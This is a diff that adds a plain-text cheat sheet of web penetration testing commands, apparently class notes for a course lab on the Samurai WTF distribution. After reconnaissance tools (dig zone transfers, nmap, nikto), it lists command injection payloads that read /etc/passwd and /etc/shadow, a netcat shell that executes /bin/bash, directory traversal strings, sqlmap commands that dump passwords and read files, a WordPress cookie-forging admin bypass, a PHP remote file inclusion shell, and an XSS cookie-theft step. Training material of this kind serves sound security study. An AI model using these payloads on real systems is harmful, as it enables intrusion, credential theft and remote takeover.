@@ -1,0 +1,178 @@
+WHOIS TOOLS COMMANDS;
+
+whois 
+
+DIG COMMANDS;
+
+dig <domain>
+dig -t mx <domain>
+dig -t AXFR <domain>
+
+
+HOST COMMANDS:
+
+host -la <domain>
+
+FIERCE COMMANDS;
+
+cd /usr/bin/samurai/fierce2
+fierce -dns <domain> -no arin,whois
+fierce -range <IP range> -dnsservers <DNS Server IP>
+
+nmap commands;
+
+OS detection:
+nmap -O <target IP>
+
+Version detection:
+nmap -sV <target domain or IP address>
+
+Ping Scan:
+nmapp -sn <Target>
+
+Robots.txt:
+cd /usr/local/share/nmap/scripts
+nmap --scripts=http-robots.txt <domain>
+
+NETCAT COMMANDS;
+
+HTTP banner check:
+nc <domain/IP> <Port>
+HEAD/HTTP/1.0 <enter> <enter>
+
+HTTPS banner check:
+nc <domain/IP> <port>
+
+THC SSLCheck COMMANDS;
+
+cd /usr/bin/samurai/thcsslcheck
+./THCSSLCheck.exe <domain> <port> > ~/Desktop/<filename.txt>
+
+SSLThing COMMANDS;
+
+cd /usr/bin/samurai/sslthing
+./sslthing <domain>:<port> > ~/Desktop/<filename.txt>
+
+NIKTO COMMANDS;
+
+cd /usr/bin/samurai/nikto
+./nikto.pl -host <domain> --Format HTM --output ~/<filename.html>
+
+CeWL COMMANDS;
+
+cd /usr/bin/samurai/cewl
+./cewl.rb http://<domain> -w ~/Desktop/<name>
+
+DirBuster COMMANDS;
+
+cd /usr/bin/samurai/DirBuster-1.0-RC1
+java -jar DirBuster-1.0-RC1.jar
+
+HEAD <enter>
+
+COMMAND INJECTION;
+
+; cat /etc/passwd
+; cat /etc/shadow
+; id
+
+Ping test:
+sudo tcpdump -ni any icmp[icmptype]=icmp-echo
+; ping -c3 <hostIp>
+
+Backdoor Shell:
+nc -lvvnp 1337
+; nc <hostip> 1337 -e /bin/bash
+
+Directory Traversal;
+
+../../../../../../../etc/shadow
+http://vulnsite/scripts/../../../winnt/system32/cmd.exe+/c+dir
+
+UNIX
+/etc/passwd
+/etc/passwd%00
+
+IIS
+/global.asa
+
+Windows
+\docume~1\fprefect\mydocu~1
+\windows\system32\cmd.exe
+
+
+SQL MAP;
+
+cd /usr/bin/samurai/sqlmap/
+./sqlmap.py -u http://www.sec542.org/scanners/sqli.php?name=Kevin
+./sqlmap.py -u www.sec542.org/scanners/sqli.php?name=Kevin --schema
+./sqlmap.py -u www.sec542.org/scanners/sqli.php?name=Kevin --passwords
+./sqlmap.py -u www.sec542.org/scanners/sqli.php?name=Kevin --tables
+./sqlmap.py -u www.sec542.org/scanners/sqli.php?name=Kevin --users
+
+./sqlmap.py -u www.sec542.org/scanners/sqli.php?name=Kevin --file-read=/etc/hosts
+./sqlmap.py -u www.sec542.org/scanners/sqli.php?name=Kevin --file-read=/etc/passwd
+./sqlmap.py -u www.sec542.org/scanners/sqli.php?name=Kevin --file-read=/etc/shadow
+
+
+WORDPRESS Blind SQL Injection:
+
+Test if Vuln:
+Hash MD5 url <http://www.sec542.org/wordpress> in HashCalc
+http://www.sec542.org/wordpress/wp-admin/admin-ajax.php?cookie=wordpressuser_c824d0d8c538ab2ba06a35095c8dd02d%253dx%2527test;+wordpresspass_c824d0d8c538ab2ba06a35095c8dd02d%253dx
+
+Exploit:
+cd ~/Desktop/
+php wordpress.php
+HASH cookie in HASHCalc
+Open Cookie Editor in firefox.
+
+Cookie1
+Name: wordpressuser_<hash1>
+Content:admin
+Host:<domain>
+Path:<path>
+Set experation date to future.
+
+Cookie2
+Name: wordpressuser_<hash1>
+Content:<hash2>
+Host:<domain>
+Path:<Path>
+Set experation date to future.
+
+Log into admin page.
+
+
+PHP RFI;
+
+Write or use the class writen shell.php code. place code in the /var/www directory.
+
+add location on .php file to the url. example below.
+http:///mutillidae/index.php?page=192.168.1.8/shell.php
+
+connect to shell with netcat over port 4242 which is port setup in class shell.php file.
+nc 192.168.1.8 4242
+
+
+XSS phpmyadmin;
+
+gedit ~/Desktop/xss_script.txt
+Copy contents and paste to end of phpmyadmin url in order to steal cookie.
+
+Use below to view the cookie.
+cat /tmp/cookiedump
+
+Xss injection steal cookie;
+
+<script>alert(document.cookie)</script>
+
+SkipFish;
+
+cd /usr/bin/samurai/skipfish
+./skipfish -W dictionaries/dictionaries.wl -o ~/Desktop/results/ http://www.sec542.org/scanners/
+
+w3af;
+
+cd /usr/bin/samurai/w3af/
+./w3af_gui
